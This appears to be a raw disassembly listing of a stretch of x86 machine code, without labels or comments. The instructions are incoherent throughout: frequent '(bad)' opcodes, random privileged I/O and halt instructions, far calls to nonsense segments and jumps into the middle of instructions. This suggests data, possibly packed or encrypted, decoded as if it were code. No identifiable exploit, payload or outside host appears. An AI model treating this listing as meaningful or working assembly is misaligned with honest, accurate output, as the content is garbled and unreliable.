  416beb:	enter  0xc2d2,0xb3
  416bef:	jge    0x416c2b
  416bf1:	sahf   
  416bf2:	sub    ebp,DWORD PTR [eax+eiz*4]
  416bf5:	add    edi,DWORD PTR [eax+0x50]
  416bf8:	lock leave 
  416bfa:	adc    DWORD PTR [ebx-0x11974685],0x1d
  416c01:	test   BYTE PTR [edi+edi*8],ah
  416c04:	and    eax,0xf1cd7320
  416c09:	or     BYTE PTR [esi+0x5bafbe2a],bh
  416c0f:	in     eax,dx
  416c10:	call   0x5b963c1f
  416c15:	ss sub eax,0xc73edd29
  416c1b:	fs cmp al,0x5f
  416c1e:	cdq    
  416c1f:	dec    esi
  416c20:	fnstenv [esi]
  416c22:	pop    eax
  416c23:	jno    0x416bf2
  416c25:	jl     0x416ba8
  416c27:	dec    eax
  416c28:	and    DWORD PTR [edx],ebx
  416c2a:	cmp    BYTE PTR [ebp+0x13],bh
  416c2d:	dec    edx
  416c2e:	adc    bh,ah
  416c30:	(bad)  
  416c31:	and    ecx,esi
  416c33:	(bad)  
  416c35:	retf   0xb81d
  416c38:	adc    bl,BYTE PTR [esi+0x3ccbba84]
  416c3e:	push   ebp
  416c3f:	or     al,cl
  416c41:	xchg   ecx,eax
  416c42:	fidiv  WORD PTR [ebx]
  416c44:	shl    DWORD PTR ds:0x41184f55,cl
  416c4a:	test   eax,0x753b0db3
  416c4f:	inc    ebx
  416c50:	sub    edi,DWORD PTR [ecx]
  416c52:	push   cs
  416c53:	dec    eax
  416c54:	ins    DWORD PTR es:[edi],dx
  416c55:	das    
  416c56:	sar    DWORD PTR [ebp-0x80],0x9a
  416c5a:	mov    bh,0xcf
  416c5c:	mov    ds:0xf1c541bf,al
  416c61:	cdq    
  416c62:	pop    esp
  416c63:	fild   DWORD PTR [ebx+0x37]
  416c66:	test   BYTE PTR [ebx-0x4],al
  416c69:	add    eax,0x97d63a69
  416c6e:	fld    DWORD PTR [edx]
  416c70:	ja     0x416cbc
  416c72:	enter  0x3de5,0xbd
  416c76:	lods   eax,DWORD PTR ds:[esi]
  416c77:	jmp    0x7ceaa324
  416c7c:	or     al,0x99
  416c7e:	imul   esi,DWORD PTR [ebp-0x68e2b9b0],0x33c804da
  416c88:	out    dx,eax
  416c89:	scas   eax,DWORD PTR es:[edi]
  416c8a:	repnz cmove ecx,DWORD PTR [ebx+0x6b105584]
  416c92:	dec    edx
  416c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c94:	dec    edi
  416c95:	cmp    eax,0x28ca004d
  416c9a:	stc    
  416c9b:	ss int3 
  416c9d:	call   FWORD PTR [ecx+ebp*4]
  416ca0:	rol    BYTE PTR [edi],cl
  416ca2:	dec    ebp
  416ca3:	pusha  
  416ca4:	cld    
  416ca5:	xor    edi,edx
  416ca7:	js     0x416c68
  416ca9:	or     ch,BYTE PTR [edx-0x728e62e6]
  416caf:	mov    ecx,0x2798f2b6
  416cb4:	in     eax,dx
  416cb5:	es retf 0x9b3d
  416cb9:	call   0x1783:0xee9ea5a4
  416cc0:	xor    eax,0x94f20254
  416cc5:	je     0x416c58
  416cc7:	ds aad 0x6e
  416cca:	es das 
  416ccc:	jno    0x416cbb
  416cce:	push   edi
  416ccf:	repz push 0xffffff8d
  416cd2:	je     0x416c9d
  416cd4:	shr    DWORD PTR [ebp+eax*1-0x75308827],0x80
  416cdc:	xchg   ebx,eax
  416cdd:	int    0xec
  416cdf:	dec    esp
  416ce0:	sahf   
  416ce1:	enter  0xc6be,0x5a
  416ce5:	mov    es,edx
  416ce7:	add    bh,BYTE PTR [edx+0x31]
  416cea:	in     eax,0xfd
  416cec:	xchg   ebx,eax
  416ced:	aas    
  416cee:	ficomp WORD PTR [edx]
  416cf0:	xor    edx,DWORD PTR [esi-0x536497b2]
  416cf6:	dec    esi
  416cf7:	ret    
  416cf8:	stc    
  416cf9:	sbb    BYTE PTR [esi+0x5b],ch
  416cfc:	lods   al,BYTE PTR ds:[esi]
  416cfd:	inc    eax
  416cfe:	mov    edi,0xf2f0d855
  416d03:	inc    ecx
  416d04:	or     edi,DWORD PTR [ebx]
  416d06:	repz push ebx
  416d08:	dec    ecx
  416d09:	xor    eax,0xa34e5271
  416d0e:	pusha  
  416d0f:	inc    esp
  416d10:	fldenv [eax+0x68]
  416d13:	rol    edx,0x6d
  416d16:	fbld   TBYTE PTR [edi+edi*4+0x66]
  416d1a:	sahf   
  416d1b:	ss enter 0x8432,0x79
  416d20:	dec    edx
  416d21:	ss es mov dl,0x5b
  416d25:	clc    
  416d26:	jmp    0x416ccf
  416d28:	jb     0x416cb1
  416d2a:	sub    eax,DWORD PTR [ecx]
  416d2c:	enter  0xb32b,0x95
  416d30:	out    0xae,al
  416d32:	pop    edi
  416d33:	fild   QWORD PTR [ebx+ebx*4]
  416d36:	and    DWORD PTR [ebp-0x3bb36a24],ebp
  416d3c:	mov    ebx,0xb6231a2b
  416d41:	cmp    al,0xa7
  416d43:	inc    edi
  416d44:	jbe    0x416d87
  416d46:	test   DWORD PTR [edx+0x27],ebp
  416d49:	inc    eax
  416d4a:	sti    
  416d4b:	sub    bh,BYTE PTR [ebp+0x60]
  416d4e:	rol    DWORD PTR [ebx+0x46a51281],cl
  416d54:	fisttp DWORD PTR [edx]
  416d56:	sub    al,0xc3
  416d58:	call   0x99a2:0xd21397c3
  416d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d60:	(bad)  
  416d61:	aaa    
  416d62:	iret   
  416d63:	hlt    
  416d64:	fldcw  WORD PTR [ebp+0x3e853a8f]
  416d6a:	pop    DWORD PTR [esp-0x62]
  416d6e:	int3   
  416d6f:	mov    ebx,DWORD PTR [ecx]
  416d71:	ret    
  416d72:	xchg   edx,eax
  416d73:	inc    esi
  416d74:	mov    bl,0xf3
  416d76:	xchg   ebx,eax
  416d77:	mov    ss:0x2f960a2a,eax
  416d7d:	scas   al,BYTE PTR es:[edi]
  416d7e:	std    
  416d7f:	rcl    DWORD PTR [esi-0x3],1
  416d82:	adc    ecx,esp
  416d84:	cli    
  416d85:	sbb    DWORD PTR [ebp+0x68],0x682f836b
  416d8c:	sub    al,0xd
  416d8e:	add    BYTE PTR [ebx],0x32
  416d91:	popf   
  416d92:	fiadd  DWORD PTR [ebp-0x5c]
  416d95:	add    al,0xe0
  416d97:	out    dx,al
  416d98:	add    al,0xee
  416d9a:	jl     0x416d28
  416d9c:	jne    0x416d6b
  416d9e:	or     bh,cl
  416da0:	inc    esp
  416da1:	dec    esp
  416da2:	mov    al,0xc5
  416da4:	fcom   DWORD PTR [edi+eiz*2-0x6]
  416da8:	enter  0x5265,0xb3
  416dac:	jle    0x416d8a
  416dae:	fwait
  416daf:	cmp    DWORD PTR [edx],eax
  416db1:	xor    dl,BYTE PTR [ebx]
  416db3:	mov    bl,BYTE PTR [eax+0x20cf63c9]
  416db9:	test   eax,0x9b7d3876
  416dbe:	adc    esi,esi
  416dc0:	or     ebp,DWORD PTR [ebx]
  416dc2:	loop   0x416e2f
  416dc4:	(bad)  
  416dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dc6:	adc    al,0x97
  416dc8:	loope  0x416e02
  416dca:	hlt    
  416dcb:	dec    ebp
  416dcc:	gs push ebp
  416dce:	push   0x2fb9ab63
  416dd3:	jmp    0xaa54:0xefac3282
  416dda:	(bad)  
  416ddc:	mov    ecx,0x63c15329
  416de1:	setbe  BYTE PTR [esi-0x3e7cb9df]
  416de8:	(bad)  
  416de9:	pop    ss
  416dea:	mov    ebx,0x9bc50ea9
  416def:	mov    dl,0x5d
  416df1:	cld    
  416df2:	cdq    
  416df3:	fsubr  DWORD PTR [ebp-0x7]
  416df6:	xchg   ebx,eax
  416df7:	jg     0x416e02
  416df9:	call   0x96f411f7
  416dfe:	mov    al,ds:0x14de6d5
  416e03:	ins    BYTE PTR es:[edi],dx
  416e04:	cwde   
  416e05:	hlt    
  416e06:	(bad)  
  416e07:	ja     0x416e2a
  416e09:	add    al,0xd6
  416e0b:	fucomip st,st(7)
  416e0d:	pop    ss
  416e0e:	and    esi,esp
  416e10:	cmp    esp,edx
  416e12:	and    eax,0x17f3332c
  416e17:	and    BYTE PTR [eax+eiz*4-0x14b391de],bh
  416e1e:	inc    esp
  416e1f:	or     esp,DWORD PTR [ebx+esi*1+0x66]
  416e23:	xor    al,0x55
  416e25:	sub    BYTE PTR [edi],0x2a
  416e28:	and    al,0x24
  416e2a:	retf   
  416e2b:	pop    ecx
  416e2c:	jbe    0x416e45
  416e2e:	pop    ss
  416e2f:	scas   al,BYTE PTR es:[edi]
  416e30:	out    dx,al
  416e31:	xchg   DWORD PTR [ebx+0x5f],edi
  416e34:	sub    al,0xe4
  416e36:	jbe    0x416e7a
  416e38:	sbb    bh,BYTE PTR [ecx+eax*1+0x4e]
  416e3c:	ret    0xed2e
  416e3f:	imul   DWORD PTR [ebx-0x71]
  416e42:	mov    bh,0xd3
  416e44:	rcl    DWORD PTR [ecx+0x5f],0x9d
  416e48:	sbb    cl,BYTE PTR [ebx+0x41]
  416e4b:	and    BYTE PTR [ecx+0x3],bh
  416e4e:	pop    es
  416e4f:	addr16 pop ss
  416e51:	add    ebp,esi
  416e53:	cmp    al,ah
  416e55:	imul   ebx,DWORD PTR [ebp+esi*2-0x5e620091],0xffffffbb
  416e5d:	dec    ecx
  416e5e:	jb     0x416e8f
  416e60:	pop    eax
  416e61:	call   0xdd93:0xe65cfd9d
  416e68:	rcl    edx,1
  416e6a:	xlat   BYTE PTR ds:[ebx]
  416e6b:	test   al,0x3e
  416e6d:	jo     0x416e82
  416e6f:	(bad)  
  416e70:	lahf   
  416e71:	je     0x416edf
  416e73:	shr    BYTE PTR [ebp+edx*4+0x10dde8c1],cl
  416e7a:	(bad)  
  416e7b:	mov    ds:0x5cff7b9a,eax
  416e80:	push   ss
  416e81:	xchg   esi,eax
  416e82:	pusha  
  416e83:	addr16 lahf 
  416e85:	test   DWORD PTR [esi+0x643eb964],esi
  416e8b:	hlt    
  416e8c:	xchg   edi,eax
  416e8d:	(bad)  
  416e8e:	call   DWORD PTR [edx-0x978260c]
  416e94:	mov    DWORD PTR [edi+0x613a6296],ebp
  416e9a:	leave  
  416e9b:	lods   al,BYTE PTR ds:[esi]
  416e9c:	cmp    bh,cl
  416e9e:	cmp    ecx,DWORD PTR gs:[esi]
  416ea1:	cld    
  416ea2:	add    BYTE PTR [edx],ah
  416ea4:	int    0x46
  416ea6:	daa    
  416ea7:	lods   eax,DWORD PTR ds:[esi]
  416ea8:	mov    dh,0xa3
  416eaa:	jmp    0x416ea8
  416eac:	push   ss
  416ead:	rcr    DWORD PTR [esi+esi*2-0x6fc75d5],cl
  416eb4:	out    dx,al
  416eb5:	inc    esp
  416eb6:	(bad)  
  416eb7:	fcmovne st,st(5)
  416eb9:	cmp    bl,bl
  416ebb:	push   eax
  416ebc:	push   edx
  416ebd:	cwde   
  416ebe:	lods   eax,DWORD PTR ds:[esi]
  416ebf:	push   ebx
  416ec0:	sbb    bh,BYTE PTR ds:0x48a154dd
  416ec6:	pop    eax
  416ec7:	cmp    bh,BYTE PTR [ebx-0x53]
  416eca:	push   eax
  416ecb:	sbb    BYTE PTR [ebx],dl
  416ecd:	rcl    DWORD PTR [eax+0x75],0x5f
  416ed1:	sbb    al,0x81
  416ed3:	je     0x416eae
  416ed5:	sub    ecx,DWORD PTR [ebx+eiz*1-0x1d]
  416ed9:	sbb    al,0x9f
  416edb:	loope  0x416ed3
  416edd:	sbb    al,0x95
  416edf:	sbb    DWORD PTR [eax-0x23],ebp
  416ee2:	js     0x416e97
  416ee4:	inc    edi
  416ee5:	aam    0x2f
  416ee7:	and    BYTE PTR [eax],ah
  416ee9:	or     BYTE PTR [esi],cl
  416eeb:	lea    edi,[esi+0x3c]
  416eee:	and    bh,BYTE PTR [ebx+0x60a2db11]
  416ef4:	sbb    ebx,DWORD PTR [ebx-0x49]
  416ef7:	lds    ebp,FWORD PTR [edx-0x7f]
  416efa:	test   BYTE PTR ds:0xf9902557,cl
  416f00:	icebp  
  416f01:	push   0xcbb6af73
  416f06:	loop   0x416f60
  416f08:	mov    edi,0xa7b6fff3
  416f0d:	in     eax,dx
  416f0e:	adc    DWORD PTR [ebp+0x18],ecx
  416f11:	mov    edi,0xe490e3d9
  416f16:	adc    ebp,ebx
  416f18:	sub    eax,0x72ac0526
  416f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f1e:	in     eax,dx
  416f1f:	mov    edx,cs
  416f21:	sar    DWORD PTR [ecx+0x40e0fa0],1
  416f27:	popa   
  416f28:	popf   
  416f29:	dec    ecx
  416f2a:	repnz mov ebx,0x47464868
  416f30:	xchg   esi,esi
  416f32:	jo     0x416f6d
  416f34:	xor    BYTE PTR ds:0xab4fe372,bl
  416f3a:	mov    al,ds:0x9679123a
  416f3f:	sub    eax,DWORD PTR [ebx]
  416f41:	es mov ch,0x30
  416f44:	sub    dl,BYTE PTR [ebx-0x50c8d12c]
  416f4a:	xchg   DWORD PTR [esi],ebp
  416f4c:	mov    dl,0x6a
  416f4e:	pop    ss
  416f4f:	or     al,0x0
  416f52:	pop    esi
  416f53:	add    ecx,DWORD PTR [ebx+0x479ec3ef]
  416f59:	dec    eax
  416f5a:	jne    0x416f57
  416f5c:	dec    ebp
  416f5d:	adc    al,BYTE PTR [ebx+0x486ca2d2]
  416f63:	xor    bl,BYTE PTR [edx+eiz*1-0x6db4c499]
  416f6a:	rcl    esi,0x71
  416f6d:	jmp    0x416f4b
  416f6f:	fimul  WORD PTR [ecx+0x52]
  416f72:	inc    ebp
  416f73:	cmp    eax,0xe7936525
  416f78:	mov    esp,DWORD PTR gs:[ecx+ecx*2]
  416f7c:	mov    ds:0xd2750b8b,al
  416f81:	leave  
  416f82:	in     eax,0x17
  416f84:	aad    0xbe
  416f86:	dec    ebp
  416f87:	push   ss
  416f88:	pop    es
  416f89:	cdq    
  416f8a:	cdq    
  416f8b:	mov    ds:0xbba2637b,eax
  416f90:	pop    ecx
  416f91:	test   ah,bl
  416f93:	mov    esi,0xc8179400
  416f98:	jge    0x416f98
  416f9a:	cli    
  416f9b:	mov    eax,0x9b9b4cc0
  416fa0:	hlt    
  416fa1:	inc    esi
  416fa2:	popa   
  416fa3:	std    
  416fa4:	stc    
  416fa5:	mov    BYTE PTR [edx-0x33],0x61
  416fa9:	pop    edx
  416faa:	fidivr DWORD PTR [esi+ecx*8+0x5b6984b8]
  416fb1:	jno    0x416f3d
  416fb3:	cmp    eax,0xe90955a9
  416fb8:	mov    dh,0x7d
  416fba:	mov    WORD PTR [eax+0x1e],fs
  416fbd:	aam    0x8d
  416fbf:	loopne 0x416f5e
  416fc1:	sub    eax,0xb416b8c8
  416fc6:	outs   dx,BYTE PTR ds:[esi]
  416fc7:	push   0x1d
  416fc9:	jbe    0x416fa0
  416fcb:	fdiv   st(0),st
  416fcd:	mov    ds:0xdc095b1,eax
  416fd2:	(bad)  
  416fd3:	in     eax,0x99
  416fd5:	(bad)  
  416fd6:	adc    eax,0xc248ad4c
  416fdb:	arpl   dx,bx
  416fdd:	lods   eax,DWORD PTR ds:[esi]
  416fde:	lea    edx,[edi]
  416fe0:	sbb    BYTE PTR [ebp+0x24f0c8e5],dh
  416fe6:	mov    esp,0xa4010de1
  416feb:	adc    DWORD PTR [edx-0x59b7ebbb],edi
  416ff1:	stos   DWORD PTR es:[edi],eax
  416ff2:	mov    fs,esp
  416ff4:	mov    bl,BYTE PTR [ebx-0xd57c089]
  416ffa:	pop    ebx
  416ffb:	add    BYTE PTR [eax-0x7f],ch
  416ffe:	pop    esi
  416fff:	imul   edi,edi,0x23d5061b
  417005:	std    
  417006:	clc    
  417007:	mov    WORD PTR [edi+0x52],fs
  41700a:	jnp    0x416fb8
  41700c:	bound  eax,QWORD PTR [eax+0x4]
  41700f:	popf   
  417010:	jmp    0x417067
  417012:	out    dx,eax
  417013:	sub    al,0x96
  417015:	loope  0x417036
  417017:	in     eax,dx
  417018:	test   eax,ebp
  41701a:	push   ebp
  41701b:	into   
  41701c:	jg     0x41701d
  41701e:	push   ss
  41701f:	popf   
  417020:	fsubr  QWORD PTR [esi]
  417022:	ins    DWORD PTR es:[edi],dx
  417023:	push   ss
  417024:	nop
  417025:	inc    esi
  417026:	xchg   edx,eax
  417027:	std    
  417028:	es stc 
  41702a:	add    al,0xeb
  41702c:	mov    eax,ds:0xf46888ad
  417031:	lock aad 0x61
  417034:	fwait
  417035:	xchg   BYTE PTR [edx+0x56],dh
  417038:	jne    0x41708b
  41703a:	pop    es
  41703b:	hlt    
  41703c:	sbb    cl,dl
  41703e:	jmp    0x417081
  417040:	js     0x4170b0
  417042:	stos   BYTE PTR es:[edi],al
  417043:	mov    ecx,0xe24eeddd
  417048:	pop    esi
  417049:	and    DWORD PTR [eax+0x9243ed3],eax
  41704f:	mov    ch,0x1a
  417052:	mov    ebp,0xc65c47a5
  417057:	int    0x32
  417059:	inc    edi
  41705a:	mov    edx,esi
  41705c:	mov    edx,0x87fc55d
  417061:	dec    eax
  417062:	xchg   edi,eax
  417063:	add    ch,BYTE PTR [eax+0x896db93]
  417069:	push   ds
  41706a:	sub    BYTE PTR [eax-0x64cba95],bh
  417070:	loope  0x417044
  417072:	imul   edi,DWORD PTR [eax+0x1a],0xcb09cf84
  417079:	clc    
  41707a:	mov    ds:0xa746f819,eax
  41707f:	mov    BYTE PTR [ecx+0x7e387296],al
  417085:	and    eax,0x99b83c21
  41708a:	inc    eax
  41708b:	add    al,0xca
  41708d:	and    DWORD PTR [ebp-0x15d6bced],esp
  417093:	in     eax,0xb
  417095:	aad    0xd4
  417097:	xchg   esi,eax
  417098:	push   ds
  417099:	cmp    al,0x58
  41709b:	pushf  
  41709c:	xchg   edx,eax
  41709d:	(bad)
  4170a2:	stos   DWORD PTR es:[edi],eax
  4170a3:	sar    DWORD PTR [esi+0x182c62c4],1
  4170a9:	cmp    eax,ebx
  4170ab:	outs   dx,BYTE PTR ds:[esi]
  4170ac:	sub    BYTE PTR [ebx+0x5afd28e1],dl
  4170b2:	cmp    al,0x49
  4170b4:	mov    bh,0x78
  4170b6:	(bad)  
  4170b8:	jecxz  0x417126
  4170ba:	jp     0x4170c8
  4170bc:	sbb    esp,DWORD PTR ds:0x20321335
  4170c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170c4:	and    DWORD PTR [ebp+0x34],ebp
  4170c7:	mov    bh,BYTE PTR [ecx-0x19703d27]
  4170cd:	jg     0x41713e
  4170cf:	test   al,0xfd
  4170d1:	lea    esi,[ebx-0x412117be]
  4170d7:	xchg   ebp,eax
  4170d8:	push   ebx
  4170d9:	mov    ds:0x9141032e,eax
  4170de:	cmp    ebx,DWORD PTR [esi]
  4170e0:	inc    esp
  4170e1:	rol    BYTE PTR [eax-0x48],1
  4170e4:	xor    al,0x5b
  4170e6:	or     ch,al
  4170e8:	adc    dh,BYTE PTR [ecx]
  4170ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170eb:	lods   eax,DWORD PTR ds:[esi]
  4170ec:	cs dec ebp
  4170ee:	lods   eax,DWORD PTR ds:[esi]
  4170ef:	sbb    ebx,ebx
  4170f1:	clc    
  4170f2:	stos   BYTE PTR es:[edi],al
  4170f3:	cli    
  4170f4:	jno    0x41713f
  4170f6:	ins    DWORD PTR es:[edi],dx
  4170f7:	mov    al,ds:0x746505ea
  4170fc:	sbb    edx,DWORD PTR fs:[ecx-0x50]
  417100:	or     edi,DWORD PTR ds:0x9eac6b99
  417106:	addr16 xchg esi,eax
  417108:	or     eax,0x5a9bbd9d
  41710d:	pop    es
  41710e:	add    al,dl
  417110:	mov    ebx,0xd2df7ac6
  417115:	mov    ?,eax
  417117:	repz jnp 0x417143
  41711a:	xchg   edx,eax
  41711b:	rol    dl,cl
  41711d:	hlt    
  41711e:	ss xor al,0x36
  417121:	push   es
  417122:	xchg   edi,eax
  417123:	mov    esp,0x3b20031
  417128:	leave  
  417129:	int3   
  41712a:	inc    eax
  41712b:	int3   
  41712c:	dec    ebx
  41712d:	pop    ebp
  41712e:	cmp    ebx,DWORD PTR [edi-0x1a]
  417131:	sub    edi,DWORD PTR [ebp-0x6e264199]
  417137:	or     BYTE PTR [edx],dh
  417139:	ret    0x9292
  41713c:	inc    edx
  41713d:	mov    DWORD PTR [ecx+0x19],ecx
  417140:	and    BYTE PTR [edi],bh
  417142:	or     al,0x34
  417144:	xchg   edi,eax
  417145:	dec    ebx
  417146:	mov    eax,ds:0xe466bc2b
  41714b:	rol    dl,0xf2
  41714e:	dec    ebx
  41714f:	cmp    BYTE PTR [esi],ah
  417151:	repz std 
  417153:	or     al,0x8c
  417155:	jnp    0x417141
  417157:	jp     0x417129
  417159:	pop    es
  41715a:	mov    ah,BYTE PTR [ebx-0x394b1454]
  417160:	jp     0x41712f
  417162:	mov    ah,0xf6
  417164:	call   0x1e16:0x8a065bd6
  41716b:	sbb    BYTE PTR [ebx-0x78],0xec
  41716f:	mov    ah,cl
  417171:	push   0x79e31004
  417176:	ror    DWORD PTR [ebx],0x83
  417179:	jle    0x4171e3
  41717b:	packsswb mm2,QWORD PTR [eax-0x3]
  41717f:	(bad)  
  417180:	sbb    edi,DWORD PTR [eax-0x2e]
  417183:	pusha  
  417184:	int    0x2c
  417186:	fisttp QWORD PTR [ecx]
  417188:	jne    0x41719c
  41718a:	arpl   WORD PTR [edi],bp
  41718c:	das    
  41718d:	pop    ss
  41718e:	mov    edi,esi
  417190:	mov    al,ds:0xd13b3939
  417195:	rcr    BYTE PTR [edx+0x35],1
  417198:	add    ebp,DWORD PTR [ebp+0x5038120]
  41719e:	jo     0x4171b5
  4171a0:	fidivr DWORD PTR [edx+0x6c956d39]
  4171a6:	mov    cl,0x40
  4171a8:	or     al,BYTE PTR [edi+ebp*8+0x39a99e7a]
  4171af:	jnp    0x4171e1
  4171b1:	xchg   esp,eax
  4171b2:	mov    al,0x9
  4171b4:	test   al,0xcc
  4171b6:	add    eax,0xd5eb41ac
  4171bb:	xchg   esp,eax
  4171bc:	out    0x9,al
  4171be:	rol    BYTE PTR [ebp+0x67],1
  4171c1:	cmp    al,0x4f
  4171c3:	or     dh,BYTE PTR [ebx]
  4171c5:	pop    ss
  4171c6:	cmp    al,0xaf
  4171c8:	mov    esi,DWORD PTR [edx+eiz*8]
  4171cb:	or     al,0x72
  4171cd:	(bad)  
  4171ce:	in     eax,0x2
  4171d0:	shl    BYTE PTR [edx-0x7d595dfb],0xbf
  4171d7:	std    
  4171d8:	and    ah,0x30
  4171db:	cli    
  4171dc:	mov    cl,0x1
  4171de:	pop    edx
  4171df:	mov    bl,0xb5
  4171e1:	pop    esi
  4171e2:	jne    0x417263
  4171e4:	xchg   edx,eax
  4171e5:	cmp    edx,DWORD PTR [ecx+0x72]
  4171e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e9:	repz (bad) 
  4171ec:	in     eax,dx
  4171ed:	mov    DWORD PTR [ecx],esp
  4171ef:	fstp   QWORD PTR [ecx+0x76]
  4171f2:	imul   esi,DWORD PTR [ebp+0x76],0xbd5b909a
  4171f9:	scas   al,BYTE PTR es:[edi]
  4171fa:	shr    al,cl
  4171fc:	mov    eax,ds:0xc0069c44
  417201:	and    BYTE PTR [eax-0x73],ah
  417204:	inc    ebx
  417205:	xchg   edx,eax
  417206:	jl     0x4171b8
  417208:	add    DWORD PTR [esi-0x46],0xffffffd8
  41720c:	mov    ds:0x2055a805,eax
  417211:	jo     0x4171b0
  417213:	sbb    BYTE PTR [edi],0x88
  417216:	shr    eax,1
  417218:	jle    0x417244
  41721a:	push   es
  41721b:	mov    ebx,0xe661ff3b
  417220:	and    eax,0xfbb5c4b8
  417225:	xor    al,0x4d
  417227:	rcl    BYTE PTR [ebx-0x56],cl
  41722a:	fnstenv [esi-0x2c]
  41722d:	sub    esi,DWORD PTR [edi-0x9bc94b8]
  417233:	sub    dh,BYTE PTR [esi+0x492cd3d6]
  417239:	mov    ah,0xc1
  41723b:	js     0x417202
  41723d:	rcl    DWORD PTR ds:0xb1489db,0xc
  417244:	sub    BYTE PTR [edx-0x4f],dh
  417247:	mov    ds:0x75268a52,al
  41724c:	popf   
  41724d:	fild   WORD PTR [edi+0x18b7d25]
  417253:	imul   esp,ecx,0x52
  417256:	pop    ss
  417257:	xchg   esi,eax
  417258:	add    al,0xb6
  41725a:	pushf  
  41725b:	shr    DWORD PTR [ecx*1+0x61b3e109],1
  417262:	mov    bh,0x42
  417264:	mov    ecx,0xc45a354c
  417269:	ror    DWORD PTR [eax],1
  41726b:	loope  0x4172de
  41726d:	jb     0x4171f6
  41726f:	retf   0xad22
  417272:	add    BYTE PTR [eax+0x6f30702],0xf0
  417279:	fsub   DWORD PTR ds:0x2cec6187
  41727f:	pop    ds
  417280:	out    dx,eax
  417281:	pushf  
  417282:	dec    esp
  417283:	cld    
  417284:	push   edi
  417285:	mov    ds:0x7690af4,al
  41728a:	fisttp DWORD PTR ds:0x1f8444a7
  417290:	sar    esp,cl
  417292:	arpl   WORD PTR [esp+eax*2-0x80],bp
  417296:	arpl   WORD PTR [esi+edx*4],sp
  417299:	mov    edx,0xcb32d136
  41729e:	mov    gs,WORD PTR [ecx]
  4172a0:	div    DWORD PTR [ebx-0xd885132]
  4172a6:	dec    ebp
  4172a7:	retf   0x8df7
  4172aa:	push   edi
  4172ab:	push   cs
  4172ac:	(bad)  
  4172ad:	mov    eax,ds:0x64c5de49
  4172b2:	aad    0xa2
  4172b4:	addr16 jg 0x4172d1
  4172b7:	iret   
  4172b8:	imul   esi,DWORD PTR [edx],0x948bdb5b
  4172be:	mov    eax,ds:0xf8412408
  4172c3:	lea    edi,[ebx]
  4172c5:	std    
  4172c6:	cli    
  4172c7:	sbb    eax,DWORD PTR [ebx]
  4172c9:	ret    
  4172ca:	mov    esi,0xe98561c8
  4172cf:	mov    dh,0x91
  4172d1:	call   0x6936:0xf112159d
  4172d8:	mov    BYTE PTR [esi+0x51c4b380],bl
  4172de:	adc    DWORD PTR [eax],esp
  4172e0:	xor    ebx,ecx
  4172e2:	stc    
  4172e3:	adc    al,0xf
  4172e5:	mov    al,0xba
  4172e7:	and    ebp,eax
  4172e9:	fcomp  QWORD PTR [edi+0x69]
  4172ec:	ret    
  4172ed:	imul   edx,eax,0x57
  4172f0:	bswap  esp
  4172f2:	pusha  
  4172f3:	cld    
  4172f4:	cld    
  4172f5:	hlt    
  4172f6:	mov    ds:0xf092bd4b,eax
  4172fb:	pop    es
  4172fc:	ja     0x417336
  4172fe:	xchg   esp,eax
  4172ff:	mov    ch,0x21
  417301:	ror    DWORD PTR [ebx],cl
  417303:	pop    edi
  417304:	stos   DWORD PTR es:[edi],eax
  417305:	mov    eax,0xc6cff4e7
  41730a:	xor    DWORD PTR [ebx+0x75],ecx
  41730d:	repz std 
  41730f:	iret   
  417310:	xchg   DWORD PTR [ebp-0x36dbc609],ebx
  417316:	ror    edi,0xb8
  417319:	(bad)  
  41731a:	ins    BYTE PTR es:[edi],dx
  41731b:	je     0x4172a9
  41731d:	test   BYTE PTR [esp+edx*8-0x2efda959],0x9
  417325:	ss pop eax
  417327:	adc    al,bl
  417329:	stos   BYTE PTR es:[edi],al
  41732a:	push   es
  41732b:	hlt    
  41732c:	jg     0x41736d
  41732e:	jle    0x4172c1
  417330:	(bad)  
  417331:	push   eax
  417332:	call   0x9520:0xac6e5691
  417339:	aad    0xe4
  41733b:	call   0xcf5f:0xfee63923
  417342:	sahf   
  417343:	(bad)  
  417344:	rcl    BYTE PTR [edx+ebp*2+0x4b1ffb3f],1
  41734b:	sub    bh,0xfe
  41734e:	or     ah,dh
  417350:	xchg   dl,dh
  417352:	pusha  
  417353:	call   0x4b83e715
  417358:	repnz (bad) 
  41735a:	pop    ss
  41735b:	(bad)  
  41735d:	xor    al,0xe8
  41735f:	cmp    bl,al
  417361:	loope  0x4173a3
  417363:	pop    esp
  417364:	mov    ebp,0xd111cf97
  417369:	retf   0x2e0a
  41736c:	pushf  
  41736d:	mov    eax,0xbbe8a0e0
  417372:	js     0x417393
  417374:	mov    ebx,0x6a0a28a2
  417379:	inc    esp
  41737a:	lds    edx,FWORD PTR [ebp-0x489b8f63]
  417380:	int3   
  417381:	mov    bl,0x96
  417383:	clc    
  417384:	in     al,0x44
  417386:	pop    esi
  417387:	push   esp
  417388:	mov    ah,0xf5
  41738a:	pop    eax
  41738b:	jbe    0x41735e
  41738d:	xchg   ebp,eax
  41738e:	repz cli 
  417390:	adc    eax,0xa6c68a1c
  417395:	aad    0x5d
  417397:	in     eax,0xdb
  417399:	inc    BYTE PTR [eax]
  41739b:	ja     0x4173ee
  41739d:	jg     0x4173bc
  41739f:	and    bh,BYTE PTR [edi-0x59cff641]
  4173a5:	(bad)  
  4173a6:	or     cl,BYTE PTR gs:[esi-0xe39fb73]
  4173ad:	les    edx,FWORD PTR [ebx]
  4173af:	mov    WORD PTR [edx+0x69b538b2],cs
  4173b5:	sti    
  4173b6:	sub    DWORD PTR [eax+0x7e98d6f3],esi
  4173bc:	je     0x41736d
  4173be:	dec    esp
  4173bf:	dec    edx
  4173c0:	das    
  4173c1:	gs (bad) 
  4173c3:	adc    ebx,eax
  4173c5:	and    al,0x53
  4173c7:	aam    0x4
  4173c9:	mov    WORD PTR [ecx-0x2883f56e],cx
  4173d0:	retf   
  4173d1:	shl    BYTE PTR [ecx+ebx*8-0x567be2a9],1
  4173d8:	popf   
  4173d9:	repz and eax,0x477c2a1f
  4173df:	cmc    
  4173e0:	inc    ebp
  4173e1:	sbb    DWORD PTR [edx+edx*4],ebp
